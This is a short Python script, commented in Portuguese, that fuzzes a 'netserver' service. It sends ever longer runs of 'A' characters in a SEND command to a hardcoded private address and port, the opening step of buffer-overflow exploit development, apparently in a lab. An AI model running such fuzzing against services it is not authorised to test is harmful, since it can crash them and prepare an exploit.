# Script para Fuzzing no netserver em python 3
#!/usr/bin/python
import socket

lista=["A"]
contador=100

while len(lista) <= 50:
	lista.append("A"*contador)
	contador = contador + 100

for dados in lista:
	print(f"Fuzzing com SEND {len(dados)} bytes")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("172.15.0.97",5800))
	s.recv(1024)
	cmd = "SEND "+dados+"\r\n"
	s.send(cmd.encode())
